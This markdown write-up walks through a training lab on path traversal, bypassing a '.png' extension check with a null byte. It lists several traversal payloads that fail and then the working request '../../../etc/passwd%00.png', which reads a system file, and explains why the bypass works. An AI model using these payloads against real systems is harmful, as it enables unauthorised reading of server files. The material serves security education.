# 🧪 Lab: File Path Traversal (Validation of File Extension with Null Byte Bypass)

## 🎯 Objective

Exploit a path traversal vulnerability to retrieve the contents of:

```id="h3k9qp"
/etc/passwd
```

<img width="954" height="416" alt="1 lab" src="https://github.com/user-attachments/assets/98f81968-c4df-4c29-a431-da9ef28bee51" />

---

## 🔍 Lab Overview

* The application loads files via a filename parameter.
* It enforces that filenames must end with:

  ```
  .png
  ```

👉 **Key flaw:** The extension check can be bypassed using a **null byte (`%00`) injection**.

---

## 🚶 Step-by-Step Solution

### 🖼️ 1. Capture Image Request

* Navigate to any product page.

* Intercept request:

  ```
  GET /image?filename=x.png HTTP/2
  ```

* Send it to **Repeater**.

<img width="589" height="727" alt="2 1 repeater" src="https://github.com/user-attachments/assets/5b724f24-423e-4b28-8ad3-17e825800ae5" />

---

### 🧪 2. Try Common Path Traversal Payloads (All Fail)

#### Attempt 1:

```id="v9p2xm"
../../../etc/passwd
```

#### Attempt 2:

```id="n4t8az"
/etc/passwd
```

#### Attempt 3:

```id="u1r6ks"
....//....//....//etc/passwd
```

#### Attempt 4 (Single Encoding):

```id="b7c3dw"
..%2f..%2f..%2fetc%2fpasswd
```

#### Attempt 5 (Double Encoding):

```id="k2m8fj"
..%252f..%252f..%252fetc%252fpasswd
```

* Result for all:

  ```
  400 Bad Request
  No such file
  ```

---

### 🧠 3. Why All These Payloads Fail

👉 The application enforces:

```id="r8y4zn"
Filename must end with .png
```

* All previous payloads:

  * Do NOT end with `.png`
  * Are rejected immediately

👉 **Important insight:**

* Even if traversal works, **extension validation blocks access**

---

### 💡 4. Apply Null Byte Bypass

* Payload:

  ```
  ../../../etc/passwd%00.png
  ```

---

### 🚀 5. Send Exploit Request

* Final request:

  ```
  GET /image?filename=../../../etc/passwd%00.png HTTP/2
  ```

* Send the request.

* Result:

  ```
  HTTP/2 200 OK
  ```

* Response:

  ```
  Contents of /etc/passwd
  ```

<img width="1176" height="720" alt="2 end" src="https://github.com/user-attachments/assets/24c964e7-ebde-4b21-aa39-38881ebc2f01" />

---

### 📄 6. Why This Works

👉 **Step-by-step breakdown:**

1. Application checks:

   ```
   ../../../etc/passwd%00.png
   ```

   ✅ Ends with `.png` → passes validation

2. `%00` is decoded into:

   ```
   NULL BYTE (\x00)
   ```

3. At system level:

   * The string is interpreted as:

     ```
     ../../../etc/passwd
     ```
   * Everything after the null byte (`.png`) is ignored

👉 **Key Insight:**

* The null byte **terminates the string early**
* Validation sees `.png`, but the OS processes only `/etc/passwd`

---

### ⚠️ Important Note

* This technique works in environments where:

  * Strings are null-terminated (e.g., older C-based handling)
* Modern systems often mitigate this, but it still appears in labs and legacy apps

---

### ✅ 7. Lab Solved

* Successfully accessed:

  ```
  /etc/passwd
  ```
* Lab is complete.

<img width="937" height="702" alt="5 success" src="https://github.com/user-attachments/assets/38502ddd-b49f-4162-ae97-fca1f596ac58" />

---

## 🧠 Why This Attack Works

* The application:

  * Checks filename ends with `.png`
  * Does not handle null bytes safely

* Attacker strategy:

  1. Append `%00` before `.png`
  2. Trick validation logic
  3. Let system truncate string and execute traversal

---

